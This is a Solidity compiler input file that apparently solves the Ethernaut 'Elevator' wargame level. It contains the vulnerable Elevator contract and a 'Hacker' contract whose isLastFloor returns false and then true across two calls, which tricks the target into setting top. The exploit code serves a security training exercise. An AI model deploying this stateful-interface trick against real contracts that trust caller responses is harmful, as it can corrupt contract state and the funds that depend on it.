{
  "language": "Solidity",
  "sources": {
    "contracts/Elevator.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ninterface Building {\n    function isLastFloor(uint256) external returns (bool);\n}\n\ncontract Elevator {\n    bool public top;\n    uint256 public floor;\n\n    function goTo(uint256 _floor) public {\n        Building building = Building(msg.sender);\n\n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);\n        }\n    }\n}\n"
    },
    "contracts/Hacker.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"./Elevator.sol\";\n\ncontract Hacker is Building {\n    address public target;\n    bool public isCaller;\n\n    constructor(address target_) public {\n        target = target_;\n    }\n\n    function isLastFloor(uint256 o) external override returns (bool) {\n        if (isCaller) {\n            return true;\n        }\n        isCaller = true;\n        return false;\n    }\n\n    function attack() external {\n        Elevator(target).goTo(101);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "evmVersion": "berlin",
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}